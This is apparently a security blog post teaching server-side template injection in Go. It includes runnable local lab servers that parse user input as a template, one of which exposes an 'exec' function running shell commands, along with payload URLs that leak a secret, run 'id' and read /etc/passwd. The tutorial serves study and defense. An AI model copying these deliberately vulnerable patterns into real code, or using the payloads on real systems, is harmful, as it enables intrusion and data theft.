---
title: "Go Template SSTI: Principles, Exploitation, and Defense"
description: "Go html/template versus text/template: local injection examples, context access, and why command execution needs exposed callable functions."
date: 2025-07-23T00:00:00.000Z
tags:
  - "Go"
  - "bx"
  - "CTF"
  - "Web"
authors:
  - "bx"
draft: false
slug: "bx1go-en"
lang: "en"
translationKey: "bx1go"
---


# SSTI Analysis in Go Templates
## Basic concepts
The Go standard library provides two template engines: `html/template` and `text/template`.

### Syntax
These are mainly notes 📝

Template syntax is supported, for example:

+ `{{ . }}`: current context
+ `{{ .Field }}`: access a field
+ `{{ if }}{{ else }}{{ end }}`: condition
+ `{{ range }}{{ end }}`: loop
+ `{{ define }}` and `{{ template }}`: template nesting

#### Data evaluation
1. Field access: `{{ .FieldName }}`

If `.` is a struct or a pointer to a struct, this accesses its exported field named `FieldName` (with an uppercase initial letter).

1. Access a nested field: `{{ .StructField.NestedField }}`
2. Access a value in a Map:

`{{ .MapName "keyName" }}` (if the Map key is a string)

`{{ index .MapName $keyVariable }}` (using the built-in `index` function, which is more general)

1. Access an element in a Slice or Array:

`{{ .SliceName 0 }}` (direct indexing is supported in Go 1.11+)

`{{ index .SliceName $indexVariable }}` (using the built-in `index` function)

1. Method call: `{{ .MethodName arg1 arg2 }}`

You can call a method on the current object `.`.

A method must return either one value, or two values where the second is of type `error`. The template automatically checks the error; if it is non-nil, execution stops.

Try this out.

1. Root data object: At the top level of a template, `.` usually points to the entire data object passed to the `Execute` method.

#### Control structures
`{{ if pipeline }}` ... `{{ end }}`

`{{ if pipeline }}` ... `{{ else }}` ... `{{ end }}`

`{{ if pipeline1 }}` ... `{{ else if pipeline2 }}` ... `{{ else }}` ... `{{ end }}`

`{{ range $index, $element := pipeline }}` ... `{{ end }}` (for Slice/Array)

`{{ range $key, $value := pipeline }}` ... `{{ end }}` (for Map)

`{{ range pipeline }}` ... `{{ else }}` ... `{{ end }}`

`{{ with pipeline }}` ... `{{ end }}`

+ Inside a `with` block, `.` becomes the result of `pipeline`.

`{{ with pipeline }}` ... `{{ else }}` ... `{{ end }}`

+ If the result of `pipeline` is `false` (according to the rules of `if`), the `else` section is executed.

#### Others
1. Pipes can also be used.
2. Call predefined built-in functions or custom functions registered by developers through `template.Funcs()`.

### Comparison of the two engines
`html/template`

Built-in **automatic escaping** prevents XSS attacks.

Supports web template features such as template inheritance and layouts.

Provides types such as `template.HTML`, `template.URL`, and `template.JS` to explicitly declare content that does not need escaping (use with care).

An example follows.

```go
package main

import (
    "html/template"
    "os"
)

func main() {
    tmpl := `<h1>Hello, {{ .Name }}</h1>`
    data := map[string]string{"Name": "<script>alert('Go Go Go!!')</script>"}

    t := template.Must(template.New("web").Parse(tmpl))
    t.Execute(os.Stdout, data)
}
```

The output shows that escaping was performed.

```xml
<h1>Hello, &lt;script&gt;alert(&#39;Go Go Go!!&#39;)&lt;/script&gt;</h1>
```

`text/template`

Go's `text/template` is mainly used to generate **plain text** output, such as configuration files, email, source code, or ordinary text messages. Unlike `html/template`, which is mainly used to generate HTML, `text/template` **does not have** context-aware automatic escaping. This means it does not automatically apply security handling based on the output location (such as an HTML tag, attribute, or JavaScript script).

Example:

```go
package main

import (
    "os"
    "text/template"
)

func main() {
    // 构建模板
    tmpl, err := template.New("").Parse("Hello，{{ . }}")
    if err != nil {
       panic(err)
    }

    err = tmpl.Execute(os.Stdout, "Bpple")
    if err != nil {
       panic(err)
    }
}
```

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1745219006661-a5920ac8-559b-4cc1-986e-ca11c3267452.png)

## 🌟Attack
### Template injection
This can mainly help us obtain variable values and other information.

I put together an example that you can run and test.

```go
package main

import (
    "fmt"
    "html"
    "log"
    "net/http"
    "text/template"
)

// 模拟一些应用数据，其中包含敏感信息
var appData = struct {
    AdminNote string
    SecretKey string
}{
    AdminNote: "System is running smoothly.",
    SecretKey: "Flag{1234567890abcdef}",
}

func main() {
    http.HandleFunc("/vulnerable", func(w http.ResponseWriter, r *http.Request) {
       // 从查询参数获取 'format'
       format := r.URL.Query().Get("format")
       if format == "" {
          format = "Welcome, user!"
       }
       templateString := format

       w.Header().Set("Content-Type", "text/plain; charset=utf-8") // 明确是纯文本
       w.WriteHeader(http.StatusOK)

       tmpl, err := template.New("vuln").Parse(templateString)
       if err != nil {
          fmt.Fprintf(w, "Template parsing error: %v\n", err)
          log.Printf("Vulnerable endpoint parse error: %v (Input: %q)", err, format)
          return
       }
       
       err = tmpl.Execute(w, appData)
       if err != nil {
          fmt.Fprintf(w, "\nTemplate execution error: %v", err)
          log.Printf("Vulnerable endpoint execute error: %v (Input: %q)", err, format)
       }
    })
    
    http.HandleFunc("/safe", func(w http.ResponseWriter, r *http.Request) {
       name := r.URL.Query().Get("name")
       if name == "" {
          name = "Guest"
       }
       templateString := "Hello, {{ .UserName }}! The admin note is: {{ .AdminNote }}"

       tmpl := template.Must(template.New("safe").Parse(templateString))
       dataForTemplate := struct {
          UserName  string
          AdminNote string

       }{
          UserName:  name,
          AdminNote: appData.AdminNote,
       }

       w.Header().Set("Content-Type", "text/plain; charset=utf-8") // 明确是纯文本
       w.WriteHeader(http.StatusOK)

       // 执行静态模板，传入包含用户数据（但没有秘密）的数据
       err := tmpl.Execute(w, dataForTemplate)
       if err != nil {
          fmt.Fprintf(w, "Template execution error: %v\n", err)
          log.Printf("Safe endpoint execute error: %v", err)
       }
    })
    
    http.HandleFunc("/safe-html-manual", func(w http.ResponseWriter, r *http.Request) {
       name := r.URL.Query().Get("name")
       if name == "" {
          name = "Guest"
       }
       
       templateString := "<h1>Hello, {{ .EscapedName }}</h1><p>Admin note: {{ .EscapedAdminNote }}</p>"
       tmpl := template.Must(template.New("safe-html").Parse(templateString))
       
       dataForTemplate := struct {
          EscapedName      string
          EscapedAdminNote string
       }{
          EscapedName:      html.EscapeString(name),            
          EscapedAdminNote: html.EscapeString(appData.AdminNote),
       }

       w.Header().Set("Content-Type", "text/html; charset=utf-8") // 输出是 HTML
       w.WriteHeader(http.StatusOK)

       err := tmpl.Execute(w, dataForTemplate)
       if err != nil {
          fmt.Fprintf(w, "Template execution error: %v\n", err)
          log.Printf("Safe HTML endpoint execute error: %v", err)
       }
    })

    fmt.Println("Starting template injection demo server on :8090...")
    fmt.Println("Endpoints:")
    fmt.Println("  Vulnerable: http://localhost:8090/vulnerable?format=<template_string>")
    fmt.Println("  Safe:       http://localhost:8090/safe?name=<user_name>")
    fmt.Println("  Safe HTML:  http://localhost:8090/safe-html-manual?name=<user_name>")
    fmt.Println("\nInjection examples for /vulnerable:")
    fmt.Println("  - Access Secret: http://localhost:8090/vulnerable?format={{.SecretKey}}")
    fmt.Println("  - List Fields:   http://localhost:8090/vulnerable?format={{.}}")
    fmt.Println("  - Execute Func:  http://localhost:8090/vulnerable?format={{printf \"Admin note is: %s\" .AdminNote}}")
    fmt.Println("  - Conditional:   http://localhost:8090/vulnerable?format={{if .SecretKey}}Secret exists!{{end}}")

    log.Fatal(http.ListenAndServe(":8090", nil))
}
```

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1745219006664-84b1a2e6-9d58-4f50-ae57-a8068e9abda1.png)

Let's test it.

```plain
vulnerable?format={{.}}
{{if .SecretKey}}Secret exists!{{end}}
```

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1745219006754-fde0962b-a885-48fd-8774-a1d7c327a044.png)

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1745219006643-e0961fda-38ec-4216-9695-98134f264422.png)

### Command execution
To achieve command execution, the code environment must contain relevant functions; in other words, they must be available for us to use.

Here is another lab:

```go
package main

import (
    "fmt"
    "html"
    "log"
    "net/http"
    "os/exec"
    "text/template"
)

var appData = struct {
    AdminNote string
    SecretKey string
}{
    AdminNote: "System is running smoothly.",
    SecretKey: "Flag{1234567890abcdef}",
}

func executeCommand(command string) string {
    cmd := exec.Command("sh", "-c", command)
    output, err := cmd.CombinedOutput()
    if err != nil {
       return fmt.Sprintf("Error executing command '%s': %v\nOutput:\n%s", command, err, string(output))
    }
    return string(output)
}

func main() {
    http.HandleFunc("/vulnerable", func(w http.ResponseWriter, r *http.Request) {
       format := r.URL.Query().Get("format")
       if format == "" {
          format = "Welcome, user!"
       }

       templateString := format

       w.Header().Set("Content-Type", "text/plain; charset=utf-8")
       w.WriteHeader(http.StatusOK)

       tmpl := template.New("vuln").Funcs(template.FuncMap{
          "exec": executeCommand,
       })

       tmpl, err := tmpl.Parse(templateString)
       if err != nil {
          fmt.Fprintf(w, "Template parsing error: %v\n", err)
          log.Printf("Vulnerable endpoint parse error: %v (Input: %q)", err, format)
          return
       }

       err = tmpl.Execute(w, appData)
       if err != nil {
          fmt.Fprintf(w, "\nTemplate execution error: %v", err)
          log.Printf("Vulnerable endpoint execute error: %v (Input: %q)", err, format)
       }
    })

    http.HandleFunc("/safe", func(w http.ResponseWriter, r *http.Request) {
       name := r.URL.Query().Get("name")
       if name == "" {
          name = "Guest"
       }
       templateString := "Hello, {{ .UserName }}! The admin note is: {{ .AdminNote }}"
       tmpl := template.Must(template.New("safe").Parse(templateString))
       dataForTemplate := struct {
          UserName  string
          AdminNote string
       }{
          UserName:  name,
          AdminNote: appData.AdminNote,
       }
       w.Header().Set("Content-Type", "text/plain; charset=utf-8")
       w.WriteHeader(http.StatusOK)
       err := tmpl.Execute(w, dataForTemplate)
       if err != nil {
          fmt.Fprintf(w, "Template execution error: %v\n", err)
          log.Printf("Safe endpoint execute error: %v", err)
       }
    })

    http.HandleFunc("/safe-html-manual", func(w http.ResponseWriter, r *http.Request) {
       name := r.URL.Query().Get("name")
       if name == "" {
          name = "Guest"
       }
       templateString := "<h1>Hello, {{ .EscapedName }}</h1><p>Admin note: {{ .EscapedAdminNote }}</p>"
       tmpl := template.Must(template.New("safe-html").Parse(templateString))
       dataForTemplate := struct {
          EscapedName      string
          EscapedAdminNote string
       }{
          EscapedName:      html.EscapeString(name),
          EscapedAdminNote: html.EscapeString(appData.AdminNote),
       }
       w.Header().Set("Content-Type", "text/html; charset=utf-8")
       w.WriteHeader(http.StatusOK)
       err := tmpl.Execute(w, dataForTemplate)
       if err != nil {
          fmt.Fprintf(w, "Template execution error: %v\n", err)
          log.Printf("Safe HTML endpoint execute error: %v", err)
       }
    })

    fmt.Println("Starting template injection demo server on :8090...")
    fmt.Println("Endpoints:")
    fmt.Println("  Vulnerable: http://localhost:8090/vulnerable?format=<template_string>")
    fmt.Println("  Safe:       http://localhost:8090/safe?name=<user_name>")
    fmt.Println("  Safe HTML:  http://localhost:8090/safe-html-manual?name=<user_name>")
    fmt.Println("\nInjection examples for /vulnerable:")
    fmt.Println("  - Access Secret: http://localhost:8090/vulnerable?format={{.SecretKey}}")
    fmt.Println("  - List Fields:   http://localhost:8090/vulnerable?format={{.}}")
    fmt.Println("  - Execute Func:  http://localhost:8090/vulnerable?format={{printf \"Admin note is: %s\" .AdminNote}}")
    fmt.Println("  - Conditional:   http://localhost:8090/vulnerable?format={{if .SecretKey}}Secret exists!{{end}}")
    fmt.Println("  - !! RCE !! :    http://localhost:8090/vulnerable?format={{exec \"id\"}}")
    fmt.Println("  - !! RCE !! :    http://localhost:8090/vulnerable?format={{exec \"ls -la /\"}}")
    fmt.Println("  - !! RCE !! :    http://localhost:8090/vulnerable?format={{exec \"cat /etc/passwd\"}}")

    log.Fatal(http.ListenAndServe(":8090", nil))
}
```

**Add to FuncMap**: In the `/vulnerable` handler, after creating a template instance, use the `.Funcs()` method to add the `executeCommand` function to the template's function map, naming it `exec`.

The template can then use `{{ exec "command" }}` to call this function. `.Funcs()` must be called before `.Parse()`.

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1745219006611-48ebe00c-1dfe-4810-b999-3220b5947c46.png)

The result of exploitation is as follows.

```plain
http://localhost:8090/vulnerable?format={{exec%20%22ls%20-la%20/%22}}
```

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1745219008400-fb66b1f2-8081-4816-8064-e8a3c71d0c77.png)

## References
https://xz.aliyun.com/news/15003

https://xz.aliyun.com/news/12088

